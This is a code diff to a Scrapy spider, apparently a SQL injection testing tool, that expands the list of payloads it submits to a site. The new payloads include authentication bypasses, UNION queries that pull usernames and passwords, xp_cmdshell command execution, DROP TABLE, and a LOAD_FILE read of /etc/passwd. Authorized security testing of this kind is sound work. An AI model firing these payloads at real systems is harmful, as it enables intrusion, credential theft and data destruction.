@@ -11,10 +11,26 @@ class SqliTestSpider(scrapy.Spider):
         self.logger.info(f"Reached start URL: {response.url}")
 
         payloads = [
-            "' OR '1'='1",
+            "' OR '1'='1' --",
             "' OR 1=1 --",
-            "'; DROP TABLE users;--"
+            "' OR '1'='1' /*",
+            "' OR '' = '",
+            "'; EXEC xp_cmdshell('dir') --",
+            "' UNION SELECT NULL, NULL, NULL --",
+            "' UNION SELECT username, password FROM users --",
+            "' AND 1=CONVERT(int, (SELECT @@version)) --",
+            "' OR SLEEP(5) --",
+            "'; DROP TABLE users; --",
+            "' UNION SELECT LOAD_FILE('/etc/passwd') --",
+            "admin' --",
+            "admin' #",
+            "admin'/*",
+            "') OR ('1'='1",
+            "') OR 1=1 --",
+            "random' OR 'x'='x",
+            "' OR EXISTS(SELECT * FROM users) --"
         ]
+
 
         for payload in payloads:
             self.logger.info(f"Submitting payload: {payload}")
